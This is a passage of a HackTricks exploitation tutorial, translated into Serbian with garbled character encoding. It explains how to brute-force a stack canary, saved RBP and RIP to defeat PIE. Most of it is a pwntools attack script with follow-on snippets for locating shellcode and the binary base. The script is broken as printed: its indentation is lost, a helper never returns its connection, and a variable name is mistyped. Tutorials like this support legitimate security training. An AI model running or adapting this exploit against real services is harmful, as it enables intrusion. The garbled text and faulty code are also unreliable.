# BF Adrese u Steku

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

**Ako se suoÄavate sa binarnim fajlom zaÅ¡tiÄ‡enim kanarijem i PIE (Pozicija Nezavisni IzvrÅ¡ni) verovatno treba da pronaÄ‘ete naÄin da ih zaobiÄ‘ete.**

![](<../../../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
Imajte na umu da **`checksec`** moÅ¾da neÄ‡e otkriti da je binarni fajl zaÅ¡tiÄ‡en kanarijem ako je statiÄki kompajliran i nije sposoban da identifikuje funkciju.\
MeÄ‘utim, moÅ¾ete to ruÄno primetiti ako otkrijete da je vrednost saÄuvana u steku na poÄetku poziva funkcije i da se ova vrednost proverava pre izlaska.
{% endhint %}

## Brute-Force Adrese

Da biste zaobiÅ¡li PIE, potrebno je da **procurite neku adresu**. A ako binarni fajl ne propuÅ¡ta nikakve adrese, najbolje je da **brute-forcujete RBP i RIP saÄuvane u steku** u ranjivoj funkciji.\
Na primer, ako je binarni fajl zaÅ¡tiÄ‡en koristeÄ‡i i **kanarija** i **PIE**, moÅ¾ete poÄeti sa brute-forcovanjem kanarije, zatim Ä‡e **sledeÄ‡ih** 8 bajtova (x64) biti saÄuvani **RBP**, a **sledeÄ‡ih** 8 bajtova Ä‡e biti saÄuvani **RIP.**

{% hint style="success" %}
Pretpostavlja se da adresa povratka unutar steka pripada glavnom binarnom kodu, koji, ako je ranjivost locirana u binarnom kodu, obiÄno Ä‡e biti sluÄaj.
{% endhint %}

Da biste brute-forcovali RBP i RIP iz binarnog fajla, moÅ¾ete shvatiti da je validan pogodak bajta taÄan ako program neÅ¡to ispiÅ¡e ili jednostavno ne sruÅ¡i. **Ista funkcija** koja je data za brute-forcovanje kanarije moÅ¾e se koristiti za brute-forcovanje RBP i RIP:
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

# CANARY BF HERE
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary

# PIE BF FROM HERE
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
Poslednja stvar koju treba da uradite da biste savladali PIE je da izraÄunate **korisne adrese iz otkrivenih** adresa: **RBP** i **RIP**.

Iz **RBP** moÅ¾ete izraÄunati **gde piÅ¡ete svoj shell u steku**. Ovo moÅ¾e biti veoma korisno da znate gde Ä‡ete napisati string _"/bin/sh\x00"_ unutar steka. Da biste izraÄunali razdaljinu izmeÄ‘u otkrivenog RBP-a i vaÅ¡eg shellcode-a, jednostavno stavite **prekidaÄ nakon otkrivanja RBP-a** i proverite **gde se nalazi vaÅ¡ shellcode**, zatim moÅ¾ete izraÄunati razdaljinu izmeÄ‘u shellcode-a i RBP-a:
```python
INI_SHELLCODE = RBP - 1152
```
Iz **RIP** moÅ¾ete izraÄunati **osnovnu adresu PIE binarnog fajla** koja Ä‡e vam biti potrebna za kreiranje **validnog ROP lanca**.\
Da biste izraÄunali osnovnu adresu, jednostavno uradite `objdump -d vunbinary` i proverite poslednje adrese disasemblerovanog koda:

![](<../../../../.gitbook/assets/image (145).png>)

U tom primeru moÅ¾ete videti da je potrebno samo **1 Byte i po** da se locira sav kod, tako da Ä‡e osnovna adresa u ovoj situaciji biti **procureni RIP, ali zavrÅ¡ava na "000"**. Na primer, ako ste procurili `0x562002970ecf`, osnovna adresa je `0x562002970000`
```python
elf.address = RIP - (RIP & 0xfff)
```
{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
